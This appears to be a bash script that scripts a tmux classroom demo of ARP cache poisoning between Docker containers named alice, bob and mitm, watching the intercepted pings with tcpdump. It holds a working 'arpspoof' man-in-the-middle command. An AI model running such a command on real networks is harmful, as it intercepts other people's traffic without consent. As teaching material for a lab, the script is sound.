#!/usr/bin/env bash

: ${SLEEP:=0.07}

run() {
  #declare pane=$1 ; shift
  : ${pane:? required}

  msg="$*"
  for (( i=0; i<${#msg}; i++ )); do
    sleep ${SLEEP:-0.07}
    tmux send-keys -t ${pane} "${msg:$i:1}"
  done
  tmux send-keys -t ${pane} ENTER
}

setup() {
  local prj=arp
  tmux new-session -ds demo "docker exec -it ${prj}-alice-1 bash"
  tmux split-window -dt 0 "docker exec -it ${prj}-bob-1 bash"
  tmux split-window -dht 0 "docker exec -it ${prj}-mitm-1 bash"
  tmux split-window -dht 2 "docker exec -it ${prj}-mitm-1 bash"
}

demo() {
  alice=0
  bob=2
  poison=1
  watch=3

  pane=$alice
  run "# checking network"
  run "ifconfig eth0 | head -2"
  run "# ping BOB to fill ARP table"
  run "ping 10.5.0.3 -c 1"
  run "# checking ARP table"
  run "##### ARP table #####"
  run "arp -a"
  run "# check BOB's MAC address"

  pane=$bob
  run "ifconfig eth0 | head -2"
  run "# ping ALICE to fill ARP table"
  run "ping 10.5.0.2 -c 1"
  run "# checking ARP table"
  run "##### ARP table #####"
  run "arp -a"

  pane=$watch
  run "# watch tcp packets [MITM] ..."
  run "tcpdump -n icmp"

  pane=$alice
  run "# lets ping BOB again"
  run "# tcpdump panel shows: nothing"
  run "ping 10.5.0.3 -c 1"

  pane=$poison
  run "# lets poison the ARP table ..."
  run "arpspoof -t 10.5.0.2  10.5.0.3"
  sleep 2

  pane=$alice
  run "# lets ping BOB now"
  run "# check the tcpdump for stealed ICMP packages"
  run "ping 10.5.0.3 -c 1"
  run "# check the poisoned ARP table"
  run "##### ARP table #####"
  run "arp -a"
  run "# check BOB's MAC address ends 00:04"

  # stop poisioning by: CTRL-c
  tmux send-keys -t $poison C-c

  pane=$alice
  run "# once the poisioning stopped, ARP table is restored. sleep 3"
  sleep 3
  run "arp -a"

}

setup
demo &
tmux attach

